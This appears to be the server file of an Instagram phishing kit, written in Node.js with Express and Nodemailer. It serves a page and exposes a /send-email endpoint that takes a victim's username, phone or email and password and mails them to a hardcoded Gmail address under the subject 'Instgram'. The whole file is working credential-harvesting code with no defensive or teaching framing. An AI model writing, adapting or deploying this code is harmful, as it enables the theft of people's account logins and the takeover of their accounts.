require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");
const cors = require("cors");
const bodyParser = require("body-parser");

// Utils
const { getLocalIP } = require("./server-scripts/getLocalIp");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serving JS scripts
app.use("/scripts", express.static(path.join(__dirname, "scripts")));
app.use("/static", express.static(path.join(__dirname, "static")));

// Configure Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: process.env.EMAIL_SERVICE,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// API Endpoint to Send Email
app.post("/send-email", async (req, res) => {
  // PUE stands for Phone number username or email just for clearity
  const { userPUE, password } = req.body;

  if (!userPUE || !password) {
    return res
      .status(400)
      .json({ error: "All fields are required (to, subject, text)." });
  }

  try {
    const info = await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_RECEIVER || "spidershah0088@gmail.com",
      subject: `Instgram`,
      text: `
      PUE: ${userPUE},
      Password: ${password}
      `,
    });

    res.status(200).json({ message: "Email sent successfully" });
  } catch (error) {
    res.status(500).json({ error: "Error sending email" });
  }
});

// Start server
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running at http://${getLocalIP()}:${PORT}`);
});
